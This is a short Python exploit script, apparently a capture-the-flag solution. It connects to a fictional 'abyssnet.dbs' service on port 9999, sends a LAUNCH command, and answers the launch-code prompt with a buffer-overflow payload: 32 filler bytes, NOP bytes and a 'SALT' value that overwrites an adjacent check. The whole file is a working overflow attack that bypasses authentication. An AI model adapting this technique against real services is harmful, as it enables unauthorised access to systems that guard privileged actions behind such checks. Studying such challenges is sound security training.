import socket
import time

HOST = "abyssnet.dbs"
PORT = 9999

def recv_until(sock, marker: bytes) -> bytes:
    """Read from the socket until we see a given marker."""
    data = b""
    while not data.endswith(marker):
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data

def main():
    with socket.create_connection((HOST, PORT)) as sock:
        sock.settimeout(3)

        # Read the banner and first prompt
        banner = recv_until(sock, b"> ")
        print(banner.decode(errors="ignore"))

        # Send the LAUNCH command
        sock.sendall(b"LAUNCH\n")

        # Wait for launch prompt
        launch_msg = recv_until(sock, b":")  # Wait for "Enter LAUNCH CODE:"
        print(launch_msg.decode(errors="ignore"))

        # Construct the payload
        buf = b"A" * 32
        nops = b"\x90" * 4
        salt = b"SALT"  # 0x53414C54
        payload = buf + nops + salt

        # Send the payload
        sock.sendall(payload + b"\n")

        # Get and print the result
        time.sleep(0.5)
        try:
            response = sock.recv(4096)
            print(response.decode(errors="ignore"))
        except socket.timeout:
            print("[!] No response received after sending payload.")

if __name__ == "__main__":
    main()